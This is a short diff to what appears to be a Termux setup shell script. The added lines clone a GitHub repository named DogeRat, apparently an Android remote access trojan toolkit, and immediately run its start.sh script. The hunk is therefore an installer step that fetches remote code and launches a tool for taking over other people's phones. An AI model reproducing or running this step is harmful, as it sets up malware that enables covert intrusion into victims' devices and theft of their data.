@@ -43,3 +43,10 @@ pkg update && upgrade -y
 clear
 pkg install git -y
 clear
+cd ..
+cd $Home
+git clone https://github.com/shivaya-dav/DogeRat
+clear
+cd DogeRat
+
+bash start.sh
